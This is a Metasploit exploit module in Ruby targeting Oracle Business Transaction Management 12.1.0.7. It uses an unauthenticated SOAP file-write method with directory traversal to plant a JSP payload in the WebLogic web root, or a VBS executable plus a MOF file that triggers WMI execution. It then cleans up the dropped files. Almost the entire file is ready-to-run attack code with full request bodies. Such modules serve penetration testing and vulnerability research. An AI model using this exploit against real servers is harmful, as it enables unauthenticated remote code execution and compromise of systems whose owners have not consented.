##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle Business Transaction Management FlashTunnelService Remote Code Execution',
      'Description'    => %q{
          This module exploits abuses the FlashTunnelService SOAP web service on Oracle
        Business Transaction Management 12.1.0.7 to upload arbitrary files, without
        authentication, using the WriteToFile method. The same method contains a directory
        traversal vulnerability, which allows to upload the files to arbitrary locations.

        In order to execute remote code two techniques are provided. If the Oracle app has
        been deployed in the same WebLogic Samples Domain a JSP can be uploaded to the web
        root. If a new Domain has been used to deploy the Oracle application, the Windows
        Management Instrumentation service can be used to execute arbitrary code.

        Both techniques has been successfully tested on default installs of Oracle BTM
        12.1.0.7, Weblogic 12.1.1 and Windows 2003 SP2. Default path traversal depths are
        provided, but the user can configure the traversal depth using the DEPTH option.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery and PoC
          'sinn3r', # Metasploit module
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'OSVDB', '85087' ],
          [ 'BID', '54839' ],
          [ 'EDB', '20318' ]
        ],
      'DefaultOptions'  =>
        {
          'WfsDelay' => 5
        },
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'           => 2048,
          'StackAdjustment' => -3500
        },
      'Platform'       => [ 'java', 'win' ],
      'Targets'        =>
        [
          [ 'Oracle BTM 12.1.0.7 / Weblogic 12.1.1 with Samples Domain / Java',
            {
              'Arch' => ARCH_JAVA,
              'Depth' => 10
            },
          ],
          [ 'Oracle BTM 12.1.0.7 / Windows 2003 SP2 through WMI',
            {
              'Arch' => ARCH_X86,
              'Platform' => 'win',
              'Depth' => 13
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Aug 07 2012'))

    register_options(
      [
        Opt::RPORT(7001),
        OptInt.new('DEPTH', [false, 'Traversal depth'])
      ], self.class)
  end

  def on_new_session(client)

    return if not @var_mof_name
    return if not @var_vbs_name

    if client.type != "meterpreter"
      print_error("NOTE: you must use a meterpreter payload in order to automatically cleanup.")
      print_error("The vbs payload (C:\\windows\\system32\\#{@var_vbs_name}.vbs) and mof file (C:\\windows\\system32\\wbem\\mof\\good\\#{@var_mof_name}.mof) must be removed manually.")
      return
    end

    # stdapi must be loaded before we can use fs.file
    client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")

    cmd = "C:\\windows\\system32\\attrib.exe -r " +
          "C:\\windows\\system32\\wbem\\mof\\good\\" + @var_mof_name + ".mof"

    client.sys.process.execute(cmd, nil, {'Hidden' => true })

    begin
      print_status("Deleting the vbs payload \"#{@var_vbs_name}.vbs\" ...")
      client.fs.file.rm("C:\\windows\\system32\\" + @var_vbs_name + ".vbs")
      print_status("Deleting the mof file \"#{@var_mof_name}.mof\" ...")
      client.fs.file.rm("C:\\windows\\system32\\wbem\\mof\\good\\" + @var_mof_name + ".mof")
    rescue ::Exception => e
      print_error("Exception: #{e.inspect}")
    end

  end

  def exploit

    peer = "#{rhost}:#{rport}"

    if target.name =~ /WMI/

      # In order to save binary data to the file system the payload is written to a .vbs
      # file and execute it from there.
      @var_mof_name = rand_text_alpha(rand(5)+5)
      @var_vbs_name = rand_text_alpha(rand(5)+5)

      print_status("Encoding payload into vbs...")
      my_payload = generate_payload_exe
      vbs_content = Msf::Util::EXE.to_exe_vbs(my_payload)

      print_status("Generating mof file...")
      mof_content = generate_mof("#{@var_mof_name}.mof", "#{@var_vbs_name}.vbs")

      if not datastore['DEPTH'] or datastore['DEPTH'] == 0
        traversal = "..\\" * target['Depth']
      else
        traversal = "..\\" * datastore['DEPTH']
      end
      traversal << "WINDOWS\\system32\\#{@var_vbs_name}.vbs"

      print_status("#{peer} - Uploading the VBS payload")

      soap_request = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" "
      soap_request << "xmlns:int=\"http://schemas.amberpoint.com/flashtunnel/interfaces\" "
      soap_request << "xmlns:typ=\"http://schemas.amberpoint.com/flashtunnel/types\">"
      soap_request << "  <soapenv:Header/>"
      soap_request << "  <soapenv:Body>"
      soap_request << "    <int:writeToFileRequest>"
      soap_request << "      <int:writeToFile handle=\"#{traversal}\">"
      soap_request << "        <typ:text>#{Rex::Text.html_encode(vbs_content)}</typ:text>"
      soap_request << "        <typ:WriteToFileRequestVersion>"
      soap_request << "        </typ:WriteToFileRequestVersion>"
      soap_request << "      </int:writeToFile>"
      soap_request << "    </int:writeToFileRequest>"
      soap_request << "  </soapenv:Body>"
      soap_request << "</soapenv:Envelope>"

      res = send_request_cgi(
        {
          'uri'        => '/btmui/soa/flash_svc/',
          'version'    => '1.1',
          'method'     => 'POST',
          'ctype'      => "text/xml;charset=UTF-8",
          'SOAPAction' => "\"http://soa.amberpoint.com/writeToFile\"",
          'data'       => soap_request,
        }, 5)

      if res and res.code == 200 and res.body =~ /writeToFileResponse/
        print_status("#{peer} - VBS payload successfully uploaded")
      else
        print_error("#{peer} - Failed to upload the VBS payload")
        return
      end

      if not datastore['DEPTH'] or datastore['DEPTH'] == 0
        traversal = "..\\" * target['Depth']
      else
        traversal = "..\\" * datastore['DEPTH']
      end
      traversal << "WINDOWS\\system32\\wbem\\mof\\#{@var_mof_name}.mof"

      soap_request = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" "
      soap_request << "xmlns:int=\"http://schemas.amberpoint.com/flashtunnel/interfaces\" "
      soap_request << "xmlns:typ=\"http://schemas.amberpoint.com/flashtunnel/types\">"
      soap_request << "  <soapenv:Header/>"
      soap_request << "  <soapenv:Body>"
      soap_request << "    <int:writeToFileRequest>"
      soap_request << "      <int:writeToFile handle=\"#{traversal}\">"
      soap_request << "        <typ:text>#{Rex::Text.html_encode(mof_content)}</typ:text>"
      soap_request << "        <typ:WriteToFileRequestVersion>"
      soap_request << "        </typ:WriteToFileRequestVersion>"
      soap_request << "      </int:writeToFile>"
      soap_request << "    </int:writeToFileRequest>"
      soap_request << "  </soapenv:Body>"
      soap_request << "</soapenv:Envelope>"

      print_status("#{peer} - Uploading the MOF file")

      res = send_request_cgi(
        {
          'uri'        => '/btmui/soa/flash_svc/',
          'version'    => '1.1',
          'method'     => 'POST',
          'ctype'      => "text/xml;charset=UTF-8",
          'SOAPAction' => "\"http://soa.amberpoint.com/writeToFile\"",
          'data'       => soap_request,
        }, 5)

      if res and res.code == 200 and res.body =~ /writeToFileResponse/
        print_status("#{peer} - MOF file successfully uploaded")
      else
        print_error("#{peer} - Failed to upload the MOF file")
        return
      end

    elsif target['Arch'] == ARCH_JAVA

      @jsp_name = rand_text_alpha(rand(5)+5)

      if not datastore['DEPTH'] or datastore['DEPTH'] == 0
        traversal = "..\\" * target['Depth']
      else
        traversal = "..\\" * datastore['DEPTH']
      end
      traversal << "\\server\\examples\\build\\mainWebApp\\#{@jsp_name}.jsp"

      print_status("#{peer} - Uploading the JSP payload")

      soap_request = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" "
      soap_request << "xmlns:int=\"http://schemas.amberpoint.com/flashtunnel/interfaces\" "
      soap_request << "xmlns:typ=\"http://schemas.amberpoint.com/flashtunnel/types\">"
      soap_request << "  <soapenv:Header/>"
      soap_request << "  <soapenv:Body>"
      soap_request << "    <int:writeToFileRequest>"
      soap_request << "      <int:writeToFile handle=\"#{traversal}\">"
      soap_request << "        <typ:text>#{Rex::Text.html_encode(payload.encoded)}</typ:text>"
      soap_request << "        <typ:WriteToFileRequestVersion>"
      soap_request << "        </typ:WriteToFileRequestVersion>"
      soap_request << "      </int:writeToFile>"
      soap_request << "    </int:writeToFileRequest>"
      soap_request << "  </soapenv:Body>"
      soap_request << "</soapenv:Envelope>"

      res = send_request_cgi(
        {
          'uri'        => '/btmui/soa/flash_svc/',
          'version'    => '1.1',
          'method'     => 'POST',
          'ctype'      => "text/xml;charset=UTF-8",
          'SOAPAction' => "\"http://soa.amberpoint.com/writeToFile\"",
          'data'       => soap_request,
        }, 5)

      if res and res.code == 200 and res.body =~ /writeToFileResponse/
        print_status("#{peer} - JSP payload successfully uploaded")
      else
        print_error("#{peer} - Failed to upload the JSP payload")
        return
      end

      print_status("#{peer} - Executing the uploaded JSP #{@jsp_name}.jsp ...")
      res = send_request_cgi(
        {
          'uri'        => "/#{@jsp_name}.jsp",
          'version'    => '1.1',
          'method'     => 'GET',
        }, 5)

    end

  end

end
